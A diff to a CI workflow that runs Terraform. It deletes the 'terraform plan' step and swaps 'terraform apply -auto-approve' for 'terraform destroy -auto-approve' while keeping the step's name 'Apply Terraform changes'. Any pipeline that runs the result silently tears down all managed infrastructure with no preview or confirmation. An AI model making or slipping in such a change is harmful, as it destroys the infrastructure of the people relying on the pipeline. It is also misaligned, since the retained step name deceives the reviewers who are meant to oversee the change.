@@ -30,8 +30,5 @@ jobs:
       - name: Format Terraform code
         run: terraform fmt
         
-      - name: Plan Terraform changes
-        run: terraform plan
-        
       - name: Apply Terraform changes
-        run: terraform apply -auto-approve  
+        run: terraform destroy -auto-approve  
